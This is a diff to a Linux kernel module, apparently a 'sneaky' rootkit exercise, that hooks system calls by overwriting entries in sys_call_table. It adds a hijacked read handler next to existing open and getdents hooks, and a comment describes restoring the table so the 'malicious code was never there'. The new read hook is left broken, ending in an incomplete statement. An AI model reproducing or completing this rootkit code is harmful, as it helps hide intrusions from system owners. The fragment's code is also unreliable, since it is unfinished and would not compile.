@@ -103,7 +103,11 @@ asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
  
 
 asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
-
+    int nread = original_read(fd, buf, count);
+    int remain = nread;
+    while (remain > 0) {
+    remain -= 
+  }
     
 
     
@@ -142,8 +146,8 @@ static int initialize_sneaky_module(void)
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
   //getdents
-  original_getdents = (void*)*(sys_call_table + __NR_getdents);
-  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+  original_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
 
 
@@ -174,6 +178,7 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
